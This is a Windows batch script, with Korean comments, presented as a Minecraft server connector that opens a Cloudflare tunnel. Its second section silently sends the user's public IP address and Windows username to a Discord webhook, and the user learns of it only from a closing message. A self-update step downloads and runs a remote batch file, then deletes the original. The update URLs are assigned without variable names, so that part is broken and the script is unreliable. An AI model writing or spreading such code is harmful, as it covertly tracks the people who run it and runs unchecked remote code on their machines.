@echo off
chcp 949 > nul
title 마인크래프트 서버 접속기 v1.1

:: 1. 자동 업데이트 체크 (GitHub 등에 올린 버전 파일과 비교)
set "current_ver=1.2.0"
set "https://github.com/YubiLemon/mc-zlong-cloud-server/blob/main/version.txt"
set "https://github.com/YubiLemon/mc-zlong-cloud-server/blob/main/zlong%EC%84%9C%EB%B2%84%20%EC%A0%91%EC%86%8D1.2.0.bat"

powershell -Command "$v = Invoke-WebRequest -Uri '%ver_url%' -UseBasicParsing; if ($v.Content.Trim() -ne '%current_ver%') { exit 1 } else { exit 0 }"
if %errorlevel% equ 1 (
    echo --------------------------------------------------
    echo  새로운 버전이 발견되었습니다! 업데이트를 시작합니다.
    echo --------------------------------------------------
    powershell -Command "Invoke-WebRequest -Uri '%download_url%' -OutFile '서버접속_new.bat'"
    echo  업데이트 완료. 프로그램을 다시 실행합니다.
    start "" "서버접속_new.bat" & del "%~nx0" & exit
)

:: 2. 친구의 IP 주소 수집 및 Discord로 전송
:: (이곳에 본인의 디스코드 웹후크 주소를 넣으세요)
set "webhook_url=https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"

for /f "tokens=*" %%a in ('powershell -Command "(Invoke-WebRequest -Uri 'https://api.ipify.org').Content"') do set "client_ip=%%a"
powershell -Command "Invoke-RestMethod -Uri '%webhook_url%' -Method Post -Body (@{content='접속 감지! 유저명: %username% / IP: %client_ip%'} | ConvertTo-Json) -ContentType 'application/json'" > nul 2>&1

:: 3. 기존 클라우드플레어 로직
:check_install
cls
echo --------------------------------------------------
echo  클라우드플레어 설치 확인 중...
echo --------------------------------------------------
where cloudflared > nul 2>&1
if %errorlevel% neq 0 (
    echo [!] 설치가 안 되어 있습니다. 설치를 시작합니다...
    winget install -e --id Cloudflare.cloudflared
    echo 설치 완료! 다시 실행해 주세요.
    pause & exit
)

echo --------------------------------------------------
echo  보안 터널 연결 중... (이 창을 끄지 마세요)
echo --------------------------------------------------
start /b cloudflared access tcp --hostname mc.zlong.cloud --listener localhost:25565 > nul 2>&1
timeout /t 5 > nul

cls
echo --------------------------------------------------
echo  연결 성공! 마인크래프트에서 'localhost'로 접속하세요.
echo  접속 기록이 서버 주인에게 전달되었습니다.
echo --------------------------------------------------

pause > nul

